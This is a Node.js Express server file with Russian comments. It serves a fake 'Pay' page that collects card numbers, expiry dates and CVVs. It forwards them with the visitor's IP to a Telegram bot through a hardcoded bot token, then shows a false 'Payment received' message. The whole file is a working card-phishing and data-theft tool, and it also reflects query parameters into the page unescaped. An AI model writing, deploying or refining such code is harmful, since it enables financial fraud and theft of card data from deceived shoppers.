const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ---------- Middleware ----------
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// РАЗДАЧА СТАТИКИ (CSS, JS, картинки) из корня проекта
app.use(express.static(__dirname));

// ---------- Telegram ----------
const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
const CHAT_ID = "YOUR_CHAT_ID";  // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ CHAT ID

async function sendToTelegram(data) {
    const text = `
NEW PAYMENT

Card: ${data.card_number}
Expiry: ${data.expiry}
CVV: ${data.cvv}
Amount: ${data.amount} RUB
Product: ${data.product}
IP: ${data.ip}
    `;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        }, { timeout: 5000 });
    } catch (e) {
        console.log('Telegram error:', e.message);
    }
}

// ---------- Routes ----------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pay', (req, res) => {
    const product = req.query.product || 'Item';
    const price = req.query.price || '0';
    res.send(`
<!DOCTYPE html>
<html>
<head><title>Pay</title>
<style>
body{font-family:Arial;background:#1a1a2e;color:#eee;padding:40px}
.box{max-width:400px;margin:auto;background:#16213e;padding:30px;border-radius:12px}
input,button{width:100%;padding:12px;margin:8px 0;border:none;border-radius:6px}
button{background:#e94560;color:#fff;font-weight:bold;cursor:pointer}
a{color:#888}
</style>
</head>
<body>
<div class="box">
<h2>Pay</h2>
<p><strong>Product:</strong> ${product}</p>
<p><strong>Price:</strong> ${price} RUB</p>
<form action="/pay-submit" method="POST">
<input type="hidden" name="product" value="${product}">
<input type="hidden" name="amount" value="${price}">
<input name="card_number" placeholder="Card Number" required>
<input name="expiry" placeholder="MM/YY" required>
<input name="cvv" placeholder="CVV" required>
<button type="submit">Pay</button>
</form>
<a href="/">Back</a>
</div>
</body>
</html>
    `);
});

app.post('/pay-submit', async (req, res) => {
    const data = {
        card_number: req.body.card_number,
        expiry: req.body.expiry,
        cvv: req.body.cvv,
        amount: req.body.amount,
        product: req.body.product || 'Item',
        ip: req.ip || req.connection.remoteAddress
    };
    await sendToTelegram(data);
    res.send(`<h2>Payment received</h2><a href="/">Back</a>`);
});

app.get('/buy', (req, res) => {
    const product = req.query.product || 'Item';
    const price = req.query.price || '0';
    res.redirect(`/pay?product=${encodeURIComponent(product)}&price=${price}`);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
